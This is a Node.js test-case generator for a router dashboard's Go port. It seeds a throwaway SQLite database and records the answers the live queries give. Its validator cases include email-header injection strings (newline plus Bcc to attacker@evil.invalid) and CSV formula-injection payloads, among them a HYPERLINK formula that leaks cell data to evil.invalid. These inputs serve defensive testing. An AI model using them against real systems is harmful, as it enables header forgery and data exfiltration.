'use strict';
/**
 * Report history cases — what the LIVE sample queries return, for the Go port.
 *
 * ── IT SEEDS A DATABASE RATHER THAN READING ONE ─────────────────────────────
 *
 * The real /data holds one operator's traffic, and none of it belongs in a
 * public repo. It is also the wrong input: the interesting rows are the ones a
 * real router rarely produces — a bucket where EVERY rtt is null, a sample
 * exactly on a bucket boundary, a month boundary SQLite has to compute with
 * strftime rather than divide.
 *
 * So this builds a throwaway database with rows chosen for those edges, runs the
 * live queries against it, and records both the SEED and the ANSWERS. The Go
 * test rebuilds the same database from the same seed and must produce the same
 * numbers — a stronger claim than "the two agree on my machine's data", because
 * the rows are named and reviewable.
 *
 * ── CONTAINER ONLY ──────────────────────────────────────────────────────────
 *
 * `src/db.js` requires better-sqlite3, which is native and installed only where
 * the app runs. Same as tools/audit-cases.js:
 *
 *   docker exec mikrodash rm -rf /tools /histcases.json
 *   docker cp tools mikrodash:/tools
 *   docker exec -e MIKRODASH_SRC=/app -e HIST_OUT=/histcases.json \
 *     mikrodash node /tools/report-history-cases.js
 *   docker cp mikrodash:/histcases.json testdata/report-history-cases.json
 *
 * and to verify:
 *
 *   docker cp testdata/report-history-cases.json mikrodash:/histcases.json
 *   docker exec -e MIKRODASH_SRC=/app -e HIST_OUT=/histcases.json \
 *     mikrodash node /tools/report-history-cases.js --check
 *
 * DATA_DIR is pointed at a temp directory BEFORE src/db.js is required, because
 * that module resolves its path at load time. Getting that wrong would open the
 * real database and run migrations on it.
 */

const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const OUT = process.env.HIST_OUT || path.join(__dirname, '..', 'testdata', 'report-history-cases.json');

// BEFORE the require, not after: src/db.js reads DATA_DIR at module load.
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'mikrodash-histcases-'));
process.env.DATA_DIR = TMP;

const ROOT = path.resolve(process.env.MIKRODASH_SRC || path.join(__dirname, '..', '..', 'MikroDash'));
const db = require(path.join(ROOT, 'src', 'db.js'));

const R = 'router-a';
const OTHER = 'router-b';

// A fixed base instant so the file is identical on every run. 2026-01-01
// 00:00:00 UTC, which is a clean boundary for the hour, day and month buckets —
// week buckets are counted from the epoch (a Thursday) and so are deliberately
// NOT aligned to it, which is what the week cases are for.
const BASE = Date.parse('2026-01-01T00:00:00Z');
const MIN = 60 * 1000;
const HOUR = 60 * MIN;
const DAY = 24 * HOUR;

/**
 * The rows, chosen for the edges rather than for volume.
 *
 * `rtt_ms` null is the one that matters most: a timed-out probe records loss
 * with no round-trip time, and the aggregate averages only the ones that exist —
 * so a bucket where every probe timed out must average to NULL, not to zero. A
 * port scanning that column into a plain float would turn "unreachable" into
 * "instant".
 */
function seed() {
  const ping = [];
  // Two targets, so `GROUP BY ..., target` is exercised.
  for (let i = 0; i < 6; i++) {
    ping.push({ router_id: R, target: '198.51.100.1', rtt_ms: 10 + i, loss_pct: 0, ts: BASE + i * 10 * MIN });
    ping.push({ router_id: R, target: '198.51.100.2', rtt_ms: 20 + i, loss_pct: i, ts: BASE + i * 10 * MIN });
  }
  // An hour in which EVERY probe timed out: rtt null, loss 100.
  for (let i = 0; i < 3; i++) {
    ping.push({ router_id: R, target: '198.51.100.1', rtt_ms: null, loss_pct: 100, ts: BASE + HOUR + i * 10 * MIN });
  }
  // An hour MIXING timeouts and replies, so the CASE WHEN is not merely
  // all-or-nothing.
  ping.push({ router_id: R, target: '198.51.100.1', rtt_ms: null, loss_pct: 100, ts: BASE + 2 * HOUR });
  ping.push({ router_id: R, target: '198.51.100.1', rtt_ms: 50, loss_pct: 0, ts: BASE + 2 * HOUR + MIN });
  // Exactly on the next day boundary, and one millisecond before it.
  ping.push({ router_id: R, target: '198.51.100.1', rtt_ms: 1.5, loss_pct: 0, ts: BASE + DAY - 1 });
  ping.push({ router_id: R, target: '198.51.100.1', rtt_ms: 2.5, loss_pct: 0, ts: BASE + DAY });
  // 40 days out, so the month and week buckets have something to separate.
  ping.push({ router_id: R, target: '198.51.100.1', rtt_ms: 99.25, loss_pct: 12.5, ts: BASE + 40 * DAY });
  // Another router entirely, which must never appear in a router-a answer.
  ping.push({ router_id: OTHER, target: '198.51.100.9', rtt_ms: 1, loss_pct: 0, ts: BASE });

  const traffic = [];
  for (const iface of ['ether1', 'ether2']) {
    for (let i = 0; i < 8; i++) {
      traffic.push({
        router_id: R, interface: iface,
        // Values that do not sum cleanly in binary, so an accumulation difference
        // between two implementations would show rather than cancel.
        rx_mbps: 1.1 + i * 0.7, tx_mbps: 0.3 + i * 0.13,
        ts: BASE + i * 20 * MIN,
      });
    }
  }
  traffic.push({ router_id: R, interface: 'ether1', rx_mbps: 940.5, tx_mbps: 12.25, ts: BASE + DAY - 1 });
  traffic.push({ router_id: R, interface: 'ether1', rx_mbps: 0, tx_mbps: 0, ts: BASE + DAY });
  traffic.push({ router_id: R, interface: 'ether1', rx_mbps: 5, tx_mbps: 5, ts: BASE + 40 * DAY });
  traffic.push({ router_id: OTHER, interface: 'ether1', rx_mbps: 7, tx_mbps: 7, ts: BASE });
  // An interface whose name sorts after the others, for the picker's ORDER BY.
  traffic.push({ router_id: R, interface: 'wlan1', rx_mbps: 2, tx_mbps: 2, ts: BASE });

  const bandwidth = [];
  for (const iface of ['ether1', 'ether2']) {
    for (let i = 0; i < 8; i++) {
      bandwidth.push({
        router_id: R, interface: iface,
        rx_mb: 12.5 + i * 3.3, tx_mb: 1.75 + i * 0.9,
        ts: BASE + i * 20 * MIN,
      });
    }
  }
  bandwidth.push({ router_id: R, interface: 'ether1', rx_mb: 1024, tx_mb: 256, ts: BASE + DAY - 1 });
  bandwidth.push({ router_id: R, interface: 'ether1', rx_mb: 0, tx_mb: 0, ts: BASE + DAY });
  bandwidth.push({ router_id: R, interface: 'ether1', rx_mb: 7.5, tx_mb: 7.5, ts: BASE + 40 * DAY });
  bandwidth.push({ router_id: OTHER, interface: 'ether1', rx_mb: 3, tx_mb: 3, ts: BASE });

  // ── alerts ────────────────────────────────────────────────────────────────
  //
  // Every nullable column gets a row that exercises it: an alert still firing
  // (resolved_at null), one resolved, one acknowledged, one with no subject and
  // no detail at all. The page renders each of those absences differently, so a
  // port that collapsed them into empty strings would look right in a summary
  // and wrong on the row.
  const alerts = [
    { router_id: R, alert_type: 'ping_loss', subject: '198.51.100.1', detail: 'loss 100%',
      fired_at: BASE + HOUR, resolved_at: null, acknowledged_at: null, acknowledged_by: null },
    { router_id: R, alert_type: 'ping_loss', subject: '198.51.100.1', detail: 'loss 100%',
      fired_at: BASE + 2 * HOUR, resolved_at: BASE + 3 * HOUR, acknowledged_at: null, acknowledged_by: null },
    { router_id: R, alert_type: 'offline', subject: null, detail: null,
      fired_at: BASE + 4 * HOUR, resolved_at: BASE + 4 * HOUR + MIN,
      acknowledged_at: BASE + 5 * HOUR, acknowledged_by: 'operator' },
    { router_id: R, alert_type: 'cpu_high', subject: 'cpu', detail: '97%',
      fired_at: BASE + DAY, resolved_at: null, acknowledged_at: null, acknowledged_by: null },
    // Two alerts at the SAME instant, so the DESC ordering has a tie to break.
    { router_id: R, alert_type: 'disk_low', subject: 'disk', detail: '3% free',
      fired_at: BASE + 40 * DAY, resolved_at: null, acknowledged_at: null, acknowledged_by: null },
    { router_id: R, alert_type: 'temp_high', subject: 'board', detail: '81C',
      fired_at: BASE + 40 * DAY, resolved_at: null, acknowledged_at: null, acknowledged_by: null },
    { router_id: OTHER, alert_type: 'offline', subject: null, detail: null,
      fired_at: BASE, resolved_at: null, acknowledged_at: null, acknowledged_by: null },
  ];

  // ── connectivity ──────────────────────────────────────────────────────────
  //
  // Buckets with mixed states, an all-online bucket and an all-offline one: the
  // uptime percentage is an integer division waiting to happen, and a bucket
  // that is 2/3 online is the one that shows it.
  const connectivity = [];
  for (let i = 0; i < 6; i++) {
    connectivity.push({ router_id: R, connected: 1, ts: BASE + i * 10 * MIN });
  }
  for (let i = 0; i < 3; i++) {
    connectivity.push({ router_id: R, connected: i === 0 ? 0 : 1, ts: BASE + HOUR + i * 10 * MIN });
  }
  for (let i = 0; i < 2; i++) {
    connectivity.push({ router_id: R, connected: 0, ts: BASE + 2 * HOUR + i * 10 * MIN });
  }
  connectivity.push({ router_id: R, connected: 1, ts: BASE + DAY });
  connectivity.push({ router_id: R, connected: 0, ts: BASE + 40 * DAY });
  connectivity.push({ router_id: OTHER, connected: 1, ts: BASE });

  // ── report schedules and their runs ───────────────────────────────────────
  //
  // Chosen for the columns that are NOT plain values: `sections` and
  // `recipients` are JSON arrays stored as TEXT, `enabled` is an INTEGER that
  // the page reads as a boolean, and `interface`, `disabled_reason` and
  // `created_by` are all nullable. A row with every nullable set and one with
  // none of them is the whole shape.
  const schedules = [
    { id: 'sch-full', router_id: R, name: 'Weekly ops report',
      sections: JSON.stringify(['ping', 'traffic', 'alerts']), interface: 'ether1',
      aggregate: 'day', recipients: JSON.stringify(['ops@example.invalid', 'noc@example.invalid']),
      frequency: 'weekly', send_hour: 7, enabled: 1, disabled_reason: null,
      created_by: 'user-1', created_at: BASE, updated_at: BASE + HOUR },
    { id: 'sch-bare', router_id: R, name: 'Daily ping',
      sections: JSON.stringify(['ping']), interface: null, aggregate: '',
      recipients: JSON.stringify(['solo@example.invalid']),
      frequency: 'daily', send_hour: 0, enabled: 0, disabled_reason: 'smtp not configured',
      created_by: null, created_at: BASE + DAY, updated_at: BASE + DAY },
    // A row whose JSON columns are MALFORMED. The original parses with a
    // try/catch and falls back to an empty array rather than taking the page
    // down; a port that trusted the column would throw on one bad row.
    { id: 'sch-broken', router_id: R, name: 'Corrupt row',
      sections: 'not json', interface: null, aggregate: '',
      recipients: '{"not":"an array"}',
      frequency: 'monthly', send_hour: 23, enabled: 1, disabled_reason: null,
      created_by: null, created_at: BASE + 2 * DAY, updated_at: BASE + 2 * DAY },
    { id: 'sch-other', router_id: OTHER, name: 'Another router',
      sections: JSON.stringify(['ping']), interface: null, aggregate: '',
      recipients: JSON.stringify(['x@example.invalid']),
      frequency: 'daily', send_hour: 7, enabled: 1, disabled_reason: null,
      created_by: null, created_at: BASE, updated_at: BASE },
  ];

  // MORE RUNS THAN THE RETENTION CAP, deliberately. `listReportRuns` clamps its
  // limit to REPORT_RUN_KEEP (20), and with only three rows seeded a request for
  // 999 and a correctly clamped one both return three — so the clamp was
  // unobservable and a mutation removing it passed. Twenty-five rows makes the
  // difference between 20 and 25 visible, which is the only thing that turns
  // that line into behaviour a gate can see.
  const runs = [
    { schedule_id: 'sch-full', ran_at: BASE + DAY, period_from: BASE, period_to: BASE + DAY,
      outcome: 'sent', source: 'schedule', actor: null, recipients_n: 2, bytes: 4096, rows_n: 120, ms: 850, error: null },
    { schedule_id: 'sch-full', ran_at: BASE + 2 * DAY, period_from: BASE + DAY, period_to: BASE + 2 * DAY,
      outcome: 'failed', source: 'schedule', actor: null, recipients_n: 0, bytes: 0, rows_n: 0, ms: 30000,
      error: 'connect ETIMEDOUT' },
    { schedule_id: 'sch-full', ran_at: BASE + 3 * DAY, period_from: BASE + 2 * DAY, period_to: BASE + 3 * DAY,
      outcome: 'sent', source: 'manual', actor: 'operator', recipients_n: 2, bytes: 5120, rows_n: 140, ms: 700, error: null },
  ];
  for (let i = 0; i < 22; i++) {
    runs.push({
      schedule_id: 'sch-full', ran_at: BASE + (4 + i) * DAY,
      period_from: BASE + (3 + i) * DAY, period_to: BASE + (4 + i) * DAY,
      outcome: i % 5 === 0 ? 'skipped' : 'sent', source: 'schedule', actor: null,
      recipients_n: 2, bytes: 4096 + i, rows_n: 100 + i, ms: 600 + i, error: null,
    });
  }

  return { ping, traffic, bandwidth, alerts, connectivity, schedules, runs };
}

function insertSeed(rows) {
  const h = db.open();
  h.prepare('DELETE FROM ping_samples').run();
  h.prepare('DELETE FROM traffic_samples').run();
  h.prepare('DELETE FROM bandwidth_usage').run();
  const p = h.prepare('INSERT INTO ping_samples (router_id, target, rtt_ms, loss_pct, ts) VALUES (?,?,?,?,?)');
  for (const r of rows.ping) p.run(r.router_id, r.target, r.rtt_ms, r.loss_pct, r.ts);
  const t = h.prepare('INSERT INTO traffic_samples (router_id, interface, rx_mbps, tx_mbps, ts) VALUES (?,?,?,?,?)');
  for (const r of rows.traffic) t.run(r.router_id, r.interface, r.rx_mbps, r.tx_mbps, r.ts);
  const b = h.prepare('INSERT INTO bandwidth_usage (router_id, interface, rx_mb, tx_mb, ts) VALUES (?,?,?,?,?)');
  for (const r of rows.bandwidth) b.run(r.router_id, r.interface, r.rx_mb, r.tx_mb, r.ts);
  h.prepare('DELETE FROM alert_events').run();
  h.prepare('DELETE FROM connectivity_events').run();
  const a = h.prepare(`INSERT INTO alert_events
    (router_id, alert_type, subject, detail, fired_at, resolved_at, acknowledged_at, acknowledged_by)
    VALUES (?,?,?,?,?,?,?,?)`);
  for (const r of rows.alerts) {
    a.run(r.router_id, r.alert_type, r.subject, r.detail, r.fired_at, r.resolved_at,
      r.acknowledged_at, r.acknowledged_by);
  }
  const c = h.prepare('INSERT INTO connectivity_events (router_id, connected, ts) VALUES (?,?,?)');
  for (const r of rows.connectivity) c.run(r.router_id, r.connected, r.ts);
  h.prepare('DELETE FROM report_runs').run();
  h.prepare('DELETE FROM report_schedules').run();
  const sch = h.prepare(`INSERT INTO report_schedules
    (id, router_id, name, sections, interface, aggregate, recipients, frequency,
     send_hour, enabled, disabled_reason, created_by, created_at, updated_at)
    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)`);
  for (const r of rows.schedules) {
    sch.run(r.id, r.router_id, r.name, r.sections, r.interface, r.aggregate, r.recipients,
      r.frequency, r.send_hour, r.enabled, r.disabled_reason, r.created_by, r.created_at, r.updated_at);
  }
  const run = h.prepare(`INSERT INTO report_runs
    (schedule_id, ran_at, period_from, period_to, outcome, source, actor,
     recipients_n, bytes, rows_n, ms, error)
    VALUES (?,?,?,?,?,?,?,?,?,?,?,?)`);
  for (const r of rows.runs) {
    run.run(r.schedule_id, r.ran_at, r.period_from, r.period_to, r.outcome, r.source,
      r.actor, r.recipients_n, r.bytes, r.rows_n, r.ms, r.error);
  }
}

function main() {
  const check = process.argv.includes('--check');
  const rows = seed();
  insertSeed(rows);

  const END = BASE + 60 * DAY;
  const queries = [];
  const q = (name, fn, args, result) => queries.push({ name, fn, args, rows: result });

  // ── raw series, including the range edges ─────────────────────────────────
  q('ping raw, whole range', 'PingSamples', [R, 0, END], db.queryPingSamples(R, 0, END));
  q('ping raw, both ends INCLUSIVE', 'PingSamples',
    [R, BASE, BASE + DAY], db.queryPingSamples(R, BASE, BASE + DAY));
  q('ping raw, empty range', 'PingSamples',
    [R, BASE - 10 * DAY, BASE - DAY], db.queryPingSamples(R, BASE - 10 * DAY, BASE - DAY));
  q('ping raw, unknown router', 'PingSamples', ['nobody', 0, END], db.queryPingSamples('nobody', 0, END));

  // ── aggregates, per interval, including one nobody defined ────────────────
  for (const agg of ['hour', 'day', 'week', 'month', 'quarter', '']) {
    q('ping agg ' + JSON.stringify(agg), 'PingSamplesAgg', [R, 0, END, agg],
      db.queryPingSamplesAgg(R, 0, END, agg));
  }

  for (const iface of ['ether1', 'ether2', 'nosuch']) {
    q('traffic raw ' + iface, 'TrafficSamples', [R, iface, 0, END],
      db.queryTrafficSamples(R, iface, 0, END));
    q('bandwidth raw ' + iface, 'BandwidthSamples', [R, iface, 0, END],
      db.queryBandwidthSamples(R, iface, 0, END));
  }
  for (const agg of ['hour', 'day', 'week', 'month', 'quarter']) {
    q('traffic agg ether1 ' + agg, 'TrafficSamplesAgg', [R, 'ether1', 0, END, agg],
      db.queryTrafficSamplesAgg(R, 'ether1', 0, END, agg));
    q('bandwidth agg ether1 ' + agg, 'BandwidthSamplesAgg', [R, 'ether1', 0, END, agg],
      db.queryBandwidthSamplesAgg(R, 'ether1', 0, END, agg));
  }

  q('traffic interfaces', 'TrafficInterfaces', [R], db.queryTrafficInterfaces(R));
  q('bandwidth interfaces', 'BandwidthInterfaces', [R], db.queryBandwidthInterfaces(R));
  q('traffic interfaces, unknown router', 'TrafficInterfaces', ['nobody'], db.queryTrafficInterfaces('nobody'));

  // ── schedules and runs ────────────────────────────────────────────────────
  q('schedules for the router', 'ReportSchedulesFor', [R], db.listReportSchedulesFor(R));
  q('schedules, unknown router', 'ReportSchedulesFor', ['nobody'], db.listReportSchedulesFor('nobody'));
  q('runs, default limit', 'ReportRuns', ['sch-full', 0], db.listReportRuns('sch-full', 0));
  q('runs, limit 1', 'ReportRuns', ['sch-full', 1], db.listReportRuns('sch-full', 1));
  q('runs, limit above the retention cap', 'ReportRuns', ['sch-full', 999], db.listReportRuns('sch-full', 999));
  q('runs, schedule with none', 'ReportRuns', ['sch-bare', 0], db.listReportRuns('sch-bare', 0));

  // ── alerts and connectivity ───────────────────────────────────────────────
  q('alerts, whole range', 'AlertEvents', [R, 0, END], db.queryAlertEvents(R, 0, END));
  q('alerts, narrow range on fired_at', 'AlertEvents', [R, BASE + HOUR, BASE + 4 * HOUR],
    db.queryAlertEvents(R, BASE + HOUR, BASE + 4 * HOUR));
  q('alerts, unknown router', 'AlertEvents', ['nobody', 0, END], db.queryAlertEvents('nobody', 0, END));
  q('connectivity raw', 'ConnectivityEvents', [R, 0, END], db.queryConnectivityEvents(R, 0, END));
  for (const agg of ['hour', 'day', 'week', 'month', 'quarter']) {
    q('connectivity agg ' + agg, 'ConnectivityEventsAgg', [R, 0, END, agg],
      db.queryConnectivityEventsAgg(R, 0, END, agg));
  }

  // ── summaries, including the percentile clamp ─────────────────────────────
  //
  // `Number(pct) || 95` turns a requested 0 into 95 rather than into the first
  // sample, and only a case that asks for 0 can tell those apart.
  for (const pct of [95, 50, 1, 99, 0, 150, -5]) {
    q('traffic summary ether1 p' + pct, 'TrafficSummary', [R, 'ether1', 0, END, pct],
      db.queryTrafficSummary(R, 'ether1', 0, END, pct));
  }
  q('traffic summary, empty range', 'TrafficSummary', [R, 'ether1', BASE - 10 * DAY, BASE - DAY, 95],
    db.queryTrafficSummary(R, 'ether1', BASE - 10 * DAY, BASE - DAY, 95));
  q('traffic summary, unknown interface', 'TrafficSummary', [R, 'nosuch', 0, END, 95],
    db.queryTrafficSummary(R, 'nosuch', 0, END, 95));
  q('bandwidth summary ether1', 'BandwidthSummary', [R, 'ether1', 0, END],
    db.queryBandwidthSummary(R, 'ether1', 0, END));
  q('bandwidth summary, empty range', 'BandwidthSummary', [R, 'ether1', BASE - 10 * DAY, BASE - DAY],
    db.queryBandwidthSummary(R, 'ether1', BASE - 10 * DAY, BASE - DAY));
  q('bandwidth summary, unknown interface', 'BandwidthSummary', [R, 'nosuch', 0, END],
    db.queryBandwidthSummary(R, 'nosuch', 0, END));

  // ── alert labels ──────────────────────────────────────────────────────────
  //
  // These live here rather than with the other pure helpers in
  // report-period-cases.js for one reason: `alerter.js` requires db.js and
  // therefore better-sqlite3, so asking it anything makes a generator
  // container-only. This one already is.
  //
  // The keys are chosen for the title-caser rather than for coverage: the three
  // explicit overrides, each acronym, and the underscore shapes that produce
  // empty segments — a leading one, a trailing one, a doubled one, and a key
  // that is nothing but underscores.
  const alerter = require(path.join(ROOT, 'src', 'alerter.js'));
  const labelKeys = ['', 'connectivity', 'routeros_update', 'routeros_updated',
    'cpu_high', 'bgp_down', 'vpn_peer_down', 'os_ok', 'CPU_HIGH', 'disk',
    '_leading', 'trailing_', 'double__underscore', '___', 'ping_loss',
    'a', 'ok', 'bgp'];
  const labels = labelKeys.map((v) => ({ in: v, out: alerter.labelFor(v) }));

  // ── SCHEDULE VALIDATION, which is the security-relevant half ──────────────
  //
  // Here rather than in report-period-cases.js because `schedules.js` requires
  // `build.js`, which requires `db.js`, which is native — the same reason the
  // alert labels live here. A host generator that pulled this in would become
  // container-only for the sake of one table.
  //
  // These addresses reach a mail envelope. An address carrying a newline injects
  // arbitrary headers — a Bcc, a forged From, a second body — so the cases below
  // are weighted toward the inputs that would do that, not toward the ones a
  // dialog produces. Every one is answered by the LIVE validator; the port has
  // to agree about what it refuses as much as about what it accepts.
  const Sched = require(path.join(ROOT, 'src', 'reports', 'schedules.js'));

  const addressCases = [
    ['ops@example.invalid'], ['  ops@example.invalid  '],
    ['a@b.co'], ['a@b.c'], ['a@b'], ['@example.invalid'], ['ops@'],
    ['ops@example'], ['ops@.invalid'], ['ops@example..invalid'],
    // The injection shapes.
    ['ops@example.invalid\nBcc: attacker@evil.invalid'],
    ['ops@example.invalid\rBcc: attacker@evil.invalid'],
    ['ops@example.invalid, attacker@evil.invalid'],
    ['ops@example.invalid; attacker@evil.invalid'],
    ['"Ops" <ops@example.invalid>'],
    ['ops@example.invalid attacker@evil.invalid'],
    ['ops\\@example.invalid'],
    // Case folding and duplicates: one delivery, first spelling kept.
    ['Ops@Example.Invalid', 'ops@example.invalid'],
    ['ops@example.invalid', 'OPS@EXAMPLE.INVALID', 'other@example.invalid'],
    // Empties are skipped rather than rejected.
    ['', 'ops@example.invalid', '   '],
    [],
    [''],
    // The caps.
    ['x'.repeat(250) + '@example.invalid'],
    ['x'.repeat(64) + '@example.invalid'],
    ['x'.repeat(65) + '@example.invalid'],
    Array.from({ length: 20 }, (_, i) => 'a' + i + '@example.invalid'),
    Array.from({ length: 21 }, (_, i) => 'a' + i + '@example.invalid'),
  ];

  const nameCases = ['Weekly ops', '  spaced  ', '', '   ',
    'with\nnewline', 'with\r\ncrlf', 'x'.repeat(100), 'x'.repeat(80), 'ünïcødé name'];

  const sectionCases = [
    ['ping'], ['connectivity', 'ping'], ['traffic'], [],
    ['nonsense'], ['ping', 'nonsense'], ['ping', 'ping'],
    ['connectivity', 'alerts', 'bandwidth', 'traffic', 'ping'],
  ];

  const call = (fn, arg) => {
    try { return { ok: true, out: fn(arg) }; }
    catch (e) { return { ok: false, error: String(e.message || e) }; }
  };

  const schedule = {
    recipients: addressCases.map((a) => ({ in: a, ...call(Sched.cleanRecipients, a) })),
    names: nameCases.map((n) => ({ in: n, ...call(Sched.cleanName, n) })),
    sections: sectionCases.map((x) => ({ in: x, ...call(Sched.cleanSections, x) })),
    aggregateFor: [
      { frequency: 'daily', aggregate: '' }, { frequency: 'weekly', aggregate: '' },
      { frequency: 'monthly', aggregate: '' }, { frequency: 'daily', aggregate: 'week' },
      { frequency: 'nonsense', aggregate: '' },
    ].map((x) => ({ ...x, out: Sched.aggregateFor(x) })),
    limits: { MAX_RECIPIENTS: Sched.MAX_RECIPIENTS, MAX_ADDRESS: Sched.MAX_ADDRESS,
              MAX_NAME: Sched.MAX_NAME },
  };


  // ── WRITES: what the live upsert actually stores ──────────────────────────
  //
  // The read queries above are compared against the live ones; the WRITE path
  // needs its own evidence, and "it round-trips" is not it — a port could
  // round-trip its own mistakes perfectly. So the LIVE upsert is handed a row,
  // the stored result is read back with the live query, and the Go side must
  // store something the same query reads back identically.
  //
  // The inputs are the shapes where a column's default or coercion decides the
  // answer: a null interface, an empty aggregate, `enabled` false, a
  // `disabledReason` present, and an UPDATE over an existing id — which must
  // leave created_by and created_at alone.
  const writeInputs = [
    { name: 'insert, everything set',
      row: { id: 'w-full', routerId: R, name: 'Full row',
             sections: ['ping', 'traffic'], iface: 'ether1', aggregate: 'day',
             recipients: ['a@example.invalid'], frequency: 'weekly', sendHour: 9,
             enabled: true, disabledReason: null, createdBy: 'user-1',
             createdAt: BASE, updatedAt: BASE } },
    { name: 'insert, nullable columns empty',
      row: { id: 'w-bare', routerId: R, name: 'Bare row',
             sections: ['ping'], iface: null, aggregate: '',
             recipients: ['b@example.invalid'], frequency: 'daily', sendHour: 0,
             enabled: false, disabledReason: null, createdBy: null,
             createdAt: BASE, updatedAt: BASE } },
    { name: 'insert, disabled with a reason',
      row: { id: 'w-why', routerId: R, name: 'Disabled row',
             sections: ['alerts'], iface: null, aggregate: 'month',
             recipients: ['c@example.invalid'], frequency: 'monthly', sendHour: 23,
             enabled: false, disabledReason: 'smtp not configured', createdBy: 'user-2',
             createdAt: BASE, updatedAt: BASE } },
    // The UPDATE. Same id, different everything — including a createdBy and
    // createdAt the ON CONFLICT list must IGNORE.
    { name: 'update leaves created_by and created_at alone',
      row: { id: 'w-full', routerId: R, name: 'Renamed',
             sections: ['connectivity'], iface: null, aggregate: '',
             recipients: ['d@example.invalid'], frequency: 'daily', sendHour: 1,
             enabled: false, disabledReason: 'switched off', createdBy: 'IMPOSTOR',
             createdAt: 1, updatedAt: BASE + DAY } },
  ];
  const writes = writeInputs.map((w) => {
    db.upsertReportSchedule(w.row);
    const stored = db.listReportSchedulesFor(R).find((r) => r.id === w.row.id);
    return { name: w.name, in: w.row, stored };
  });
  // ── enable / disable, which upsert does not reach ─────────────────────────
  //
  // `setReportScheduleEnabled` is a different statement with its own null
  // handling: enabling CLEARS the reason, disabling stores it, and an empty
  // reason must become NULL rather than ''. None of that is exercised by the
  // upsert cases, and a mutation storing '' passed until these were added.
  //
  // `updated_at` is Date.now() inside the live function, so it cannot be
  // compared — it is blanked on both sides and the note says why.
  const toggleInputs = [
    { name: 'disable with a reason', enabled: false, reason: 'smtp not configured' },
    { name: 'disable with no reason', enabled: false, reason: '' },
    { name: 'disable with a null reason', enabled: false, reason: null },
    { name: 'enable clears the reason', enabled: true, reason: 'ignored when enabling' },
  ];
  const toggles = toggleInputs.map((t) => {
    db.setReportScheduleEnabled('w-full', t.enabled, t.reason);
    const stored = db.listReportSchedulesFor(R).find((r) => r.id === 'w-full');
    return { name: t.name, enabled: t.enabled, reason: t.reason,
             stored: { ...stored, updated_at: 0 } };
  });

  // Leave the table as the read cases expect it.
  for (const w of writeInputs) db.deleteReportSchedule(w.row.id);

  // ── CSV, the second injection surface ─────────────────────────────────────
  //
  // A cell starting `=`, `+`, `-`, `@`, tab or CR is a FORMULA to Excel and
  // Sheets, and several of these columns carry router-controlled text. The cases
  // are weighted accordingly: every trigger character, each combined with a
  // comma and a quote so the ORDER of the two escapes is pinned, plus the
  // ordinary quoting rules and the null/undefined handling.
  const F2 = require(path.join(ROOT, 'src', 'reports', 'format.js'));
  const csvCases = [
    { name: 'plain', columns: ['a', 'b'], rows: [{ a: 'x', b: 'y' }] },
    { name: 'empty rows', columns: ['a'], rows: [] },
    { name: 'null and undefined', columns: ['a', 'b', 'c'], rows: [{ a: null, b: undefined }] },
    { name: 'numbers and booleans', columns: ['a', 'b', 'c'],
      rows: [{ a: 0, b: 12.5, c: true }, { a: -1, b: 1e21, c: false }] },
    { name: 'comma', columns: ['a'], rows: [{ a: 'x,y' }] },
    { name: 'quote', columns: ['a'], rows: [{ a: 'say "hi"' }] },
    { name: 'newline', columns: ['a'], rows: [{ a: 'one\ntwo' }] },
    { name: 'comma and quote', columns: ['a'], rows: [{ a: 'a,"b"' }] },
    // The formula triggers, alone.
    { name: 'equals', columns: ['a'], rows: [{ a: '=1+1' }] },
    { name: 'plus', columns: ['a'], rows: [{ a: '+1' }] },
    { name: 'minus', columns: ['a'], rows: [{ a: '-1' }] },
    { name: 'at', columns: ['a'], rows: [{ a: '@SUM(A1)' }] },
    { name: 'tab', columns: ['a'], rows: [{ a: '\tx' }] },
    { name: 'carriage return', columns: ['a'], rows: [{ a: '\rx' }] },
    // ORDER OF ESCAPES: prefix first, then quote-wrap.
    { name: 'equals with a comma', columns: ['a'], rows: [{ a: '=a,b' }] },
    { name: 'equals with a quote', columns: ['a'], rows: [{ a: '="a"' }] },
    { name: 'the real shape', columns: ['a'],
      rows: [{ a: '=HYPERLINK("http://evil.invalid?"&A1,"ok")' }] },
    // A trigger that is NOT leading must not be prefixed.
    { name: 'trigger in the middle', columns: ['a'], rows: [{ a: 'x=1' }] },
    { name: 'negative number', columns: ['a'], rows: [{ a: -5 }] },
    // A column no row has.
    { name: 'missing column', columns: ['a', 'zzz'], rows: [{ a: 'x' }] },
  ];
  const csv = csvCases.map((c) => ({
    name: c.name, columns: c.columns, rows: c.rows, out: F2.toCsv(c.rows, c.columns),
  }));

  // ── the EXPORT formatters, which are not the page's ───────────────────────
  //
  // `format.js`'s tsFmt differs from the page's fmtTs twice over: an absent
  // timestamp is "" rather than "—", and with no displayTimezone it renders UTC
  // WITH A SUFFIX rather than browser-local. Both are easy to smooth away and
  // both change what a downloaded file means, so both are pinned.
  //
  // Settings.load() supplies the zone, so the no-zone branch is what this /data
  // exercises; the zone branch is covered by passing one explicitly through the
  // same Intl call the function uses.
  const exportFmt = {
    tsFmt: [0, 1, 1767225600000, 1767225600123, 1787451748377, -1]
      .map((ts) => ({ in: ts, out: F2.tsFmt(ts) })),
    fmtDuration: [0, -1, 1, 999, 1000, 59000, 60000, 61000, 3599000, 3600000, 3661000, 86400000]
      .map((ms) => ({ in: ms, out: F2.fmtDuration(ms) })),
  };

  const body = JSON.stringify({
    note: 'Generated by tools/report-history-cases.js — do not edit. Answers come ' +
          'from the queries in src/db.js, run against the seed rows recorded here, ' +
          'and from alerter.labelFor.',
    base: BASE, end: END, seed: rows, queries, labels, schedule, writes, toggles, csv, exportFmt,
  }, null, 2) + '\n';

  db.close();
  fs.rmSync(TMP, { recursive: true, force: true });

  if (check) {
    const cur = fs.existsSync(OUT) ? fs.readFileSync(OUT, 'utf8') : null;
    if (cur !== body) {
      console.error('report-history-cases.json is stale — the queries in db.js have changed.\n' +
                    'Regenerate it (see the header for the container commands).');
      process.exit(1);
    }
    console.log('report history cases up to date (' + queries.length + ' queries)');
    return;
  }
  fs.writeFileSync(OUT, body);
  console.log('wrote ' + OUT + ' — ' + queries.length + ' queries over ' +
    (rows.ping.length + rows.traffic.length + rows.bandwidth.length) + ' seeded rows');
}

main();
